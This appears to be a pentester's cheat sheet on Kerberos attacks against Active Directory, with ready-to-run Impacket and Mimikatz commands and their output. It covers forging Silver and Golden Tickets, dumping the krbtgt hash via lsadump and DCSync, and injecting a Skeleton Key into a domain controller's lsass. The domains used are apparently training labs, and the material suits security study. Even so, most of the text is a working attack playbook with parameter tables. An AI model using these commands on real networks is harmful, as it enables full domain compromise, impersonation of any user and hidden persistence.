## # `Silver Ticket Attack via Linux` -

[Silver Ticket attack](https://adsecurity.org/?p=2011) 

Silver ticket exploitation is a specific attack that involves manipulating the Kerberos Ticket Granting Ticket (TGT) to create forged service tickets, which grant unauthorized access to specific services. This attack is used when an attacker has acquired a user's hashed credentials, either through credential theft or other means. The attacker then creates a forged ticket (silver ticket) for a specific service and uses it to gain unauthorized access.

==A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC==. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.

To create a Silver Ticket, an attacker needs:

1. The NTLM hash of the password for the service account;
2. The SID of the domain
3. The service principle name (SPN) associated with the account.

- To get an NTLM hash of a password “Pegasus60”(example), You can use the commands from [this post](https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html) :

```bash
napster@hacky$ iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4 (stdin)= b999a16500b87d17ec7f2e2a68778f05
```

- For Domain SID you can either use `ldap` :

```bash
napster@hacky$ ldapsearch -h dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)" 
# extended LDIF
#
# LDAPv3
# base <DC=scrm,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#
...[snip]...
# Administrator, Users, scrm.local
dn: CN=Administrator,CN=Users,DC=scrm,DC=local
...[snip]...                         
objectSid:: AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
...[snip]... 
```

You need that SID in string form, so you can use [this blog](https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253) and some Python to write a converter:

```python
#!/usr/bin/env python3

import base64
import struct
import sys

b64sid = sys.argv[1]
binsid = base64.b64decode(b64sid)
a, N, cccc, dddd, eeee, ffff, gggg = struct.unpack("BBxxxxxxIIIII", binsid)
bb, bbbb = struct.unpack(">xxHIxxxxxxxxxxxxxxxxxxxx", binsid)
bbbbbb = (bb << 32) | bbbb

print(f"S-{a}-{bbbbbb}-{cccc}-{dddd}-{eeee}-{ffff}-{gggg}")
```

```bash
napster@hacky$ python sid.py  AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
S-1-5-21-2743207045-1827831105-2542523200-500
```

The domain SID is that SID without the `-500`.

<mark style="background: #3D7EFFA6;">Domain SID Alternative</mark> :

An alternative (and simpler) way to get the domain SID is with the `getPac.py` script from Impacket. This script is meant to get the Privilege Attribute Certificate for any user, which just requires auth as an user on the domain.

```bash
napster@hacky$ getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation                                   
                                                            
KERB_VALIDATION_INFO 
LogonTime:                           
    dwLowDateTime:                   861207478 
    dwHighDateTime:                  30986970                                                                           
LogoffTime:                            
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647 
KickOffTime:                           
    dwLowDateTime:                   4294967295 
    dwHighDateTime:                  2147483647                                                                         
PasswordLastSet:                             
    dwLowDateTime:                   2585823167             
    dwHighDateTime:                  30921784 
PasswordCanChange:                                          
    dwLowDateTime:                   3297396671 
    dwHighDateTime:                  30921985                                                                           
PasswordMustChange:                                                                                                     
    dwLowDateTime:                   4294967295                                                                         
    dwHighDateTime:                  2147483647 
EffectiveName:                   'administrator'                                                                        
FullName:                        '' 
LogonScript:                     ''    
ProfilePath:                     ''                                                                                     
HomeDirectory:                   '' 
HomeDirectoryDrive:              ''    
LogonCount:                      252                   
BadPasswordCount:                0 
UserId:                          500                                                                                    
PrimaryGroupId:                  513        
...[snip]...
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

The last item is the domain SID

- You can acquire the SPN with `GetUserSPNS.py` from Impacket, An example of Mssql spn will be like - `MSSQLSvc/dc1.scrm.local:1433`.

## # `Generating Ticket` -

`ticketer.py` (or `impacket-ticketer`) will generate a ticket using the information gathered :

```bash
napster@hacky$ ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

The output file is `administrator.ccache`, which is a kerberos ticket as administrator that only the MSSQL service will trust.

## # `Connecting on Linux` -

Import the ccache like this -

```bash
napster@hacky$ KRB5CCNAME=administrator.ccache klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@SCRM.LOCAL

Valid starting       Expires              Service principal
06/14/2022 18:44:15  06/14/2032 18:44:15  MSSQLSvc/dc1.scrm.local:1433@SCRM.LOCAL
        renew until 06/14/2032 18:44:15
```

Using that same method, `mssqlclient.py` can connect to the DB using the ticket :

```bash
napster@hacky$ KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```

## # `Silver Ticket Windows` -

• Using hash of the Domain Controller computer account, below command provides access to shares on the DC :

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorpdc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

- Silver ticket for the HOST SPN which will allow us to schedule a task on the target :

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorpdc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

• Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more.

| Invoke-Mimikatz -Command   |   |
|-----------------------------|--------------------------------------------------------------------|
| kerberos::golden|Name of the module (there is no Silver module!)                                                             |
| /User:Administrator |Username for which the TGT is generated                                     |
| /domain:dollarcorp.moneycorp.local |Domain FQDN                                                  |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain                                |                                                                
| /target:dcorp-dc.dollarcorp.moneycorp.local | Target server FQDN|
| /service:cifs | The SPN name of service for which TGS is to be created |
| /rc4:6f5b5acaf7433b3282ac22e21e62ff22  | NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys which is more silent |
| /id:500 /groups:512 | Optional User RID (default 500) and Group (default 513 512 520 518 519) |
| /ptt | Injects the ticket in current PowerShell process - no need to save the ticket on disk |
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

## # `Golden Ticket Attack` -

1. A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
2. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.

• Execute mimikatz on DC as DA to get krbtgt hash :

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' – Computername dcorp-dc
```

• On any machine :

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

| Invoke-Mimikatz -Command   |   |
|-----------------------------|--------------------------------------------------------------------|
| kerberos::golden|Name of the module                                                             |
| /User:Administrator |Username for which the TGT is generated                                     |
| /domain:dollarcorp.moneycorp.local |Domain FQDN                                                  |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain                                |                                                                
| /krbtgt:ff46a9d8bd66c6efd77603da26796f35 | NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys which is more silent.|
| /id:500 /groups:512 | Optional User RID (default 500) and Group default 513 512 520 518 519) |
| /ptt or /ticket  |  Injects the ticket in current PowerShell process - no need to save the ticket on disk ; Saves the ticket to a file for later use|
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.|
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes|
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

• To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges (or a user that has replication rights on the domain object) :

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## # `Skeleton Key` -

• Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.

• Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required :

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorpdc.dollarcorp.moneycorp.local
```

• Now, it is possible to access any machine with a valid username and password as "mimikatz" :

```powershell
Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
```

• In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:

```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

